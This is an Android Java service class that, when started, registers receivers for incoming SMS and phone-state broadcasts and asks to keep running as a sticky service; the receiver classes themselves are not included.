package tz.co.taba.logs.config;

import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.support.annotation.Nullable;

public class Service extends android.app.Service {

    public Service(){

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

            //Sms Receiver
            SmsReceiver receiver = new SmsReceiver();
            registerReceiver(receiver,new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));

            //Call Receiver
            CallReceiver callReceiver = new CallReceiver();
            registerReceiver(callReceiver,new IntentFilter("android.intent.action.PHONE_STATE"));

        return START_STICKY;
    }

}
